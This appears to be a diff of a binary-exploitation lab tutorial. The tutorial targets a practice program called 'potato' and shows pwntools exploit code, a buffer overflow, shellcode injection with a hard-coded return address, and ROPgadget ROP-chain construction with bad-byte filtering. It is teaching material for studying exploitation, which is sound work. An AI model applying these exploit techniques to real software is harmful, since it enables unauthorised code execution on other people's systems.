@@ -186,11 +186,11 @@ Start a python virtual environment, install the `pwntools` package.
 virtualenv venv
 . ./venv/bin/activate
 pip install pwntools
-python3 pwn_potato.py
+python3 pwn_potato2.py
 ```
 
-Change the `elf` variable in `pwn_potato.py` such that it runs the binary `./potato2/potato` in the current
-folder, and stops in line 192 of func.c, the epilogue of `change_name()`. When `./potato2/potato` asks for a new name,
+Change the `elf` variable in `pwn_potato2.py` such that it runs the binary `./potato` in the current
+folder, and stops in line 192 of func.c, the epilogue of `change_name()`. When `./potato` asks for a new name,
 the script provides 100 'A's, which will be enough to invoke a buffer overflow:
 
 ```python
@@ -199,7 +199,7 @@ the script provides 100 'A's, which will be enough to invoke a buffer overflow:
 from pwn import *
 import sys
 
-elf = ELF("./potato2/potato")
+elf = ELF("./potato")
 context.binary = elf
 context.arch = 'i386'
 context.bits = 32
@@ -227,7 +227,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-The python script is executed via `python3 pwn_potato.py`, or directly via `./pwn_potato.py`.
+The python script is executed via `python3 pwn_potato2.py`, or directly via `./pwn_potato2.py`.
 
 In the `gef` window, we issue `ni` which steps over the next assembly statement, then press enter a few times
 until the debugger halts at the `ret` statement. In the next step, the debugger will set the instruction pointer
@@ -344,7 +344,11 @@ This can be translated into a sequence of bytes via `nasm -f elf32 -l listfile.l
     12 00000012 CD80                        int 0x80
 ```
 
-The byte sequence in `listfile.list` is the shellcode to inject on the buffer:
+The byte sequence in `listfile.list` is the shellcode to inject on the buffer. Moreover,
+the return address must be overwritten with the start of the injected shellcode.
+In the example below, the shellcode is put at the beginning of `input_username, so
+the return address must point there. The address can be retrieved by `p $input_username`
+in the debugger, in the example below, it is `0xffffccde`:
 ```python
 # ...
 p.sendline(b"changename")
@@ -469,7 +473,7 @@ p += pack('<I', 0x0804c6c2) # int 0x80
 
 The generated ROP chain can not yet be used in `pwn_potato2.py`, some bytes in the ROP chain 
 prevent the copying of the complete payload onto the stack, so to avoid their usage: 
-`ROPgadget --binary potato_rop --ropchain --badbytes "00|09|0c|0d"`.
+`ROPgadget --binary potato_rop --ropchain --badbytes "00|09|0a|0c|0d"`.
 This generates a ROP chain, which is copied completely, however the ROP chain still uses one gadget that
 must be replaced:
 
@@ -481,7 +485,7 @@ p += pack('<I', 0x41414141) # padding
 
 This gadget is used to increment `eax`, however, the `pop es` causes a segfault. To find gadgets
 which include the `inc eax` and `ret` commands:
-`ROPgadget --binary potato_rop --ropchain --badbytes "00|09|0c|0d" | grep "inc eax" | grep "ret"`
+`ROPgadget --binary potato_rop --ropchain --badbytes "00|09|0a|0c|0d" | grep "inc eax" | grep "ret"`
 
 This returns a gadget which does not `pop esi`: `0x0806a8bc : inc eax ; pop edi ; ret`.
 By replacing all occurrences of the gadget above with the new one:
